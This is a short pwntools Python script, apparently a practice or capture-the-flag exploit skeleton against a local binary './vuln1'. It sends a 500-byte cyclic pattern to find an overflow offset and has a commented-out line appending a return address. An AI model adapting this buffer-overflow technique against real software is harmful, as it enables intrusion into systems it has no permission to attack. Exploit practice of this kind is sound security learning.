from pwn import *

p = process('./vuln1')
pause()
payload = cyclic(500)
#payload += p64(0x0000557a6eb3b22e)

p.sendlineafter('string', payload)
p.interactive()

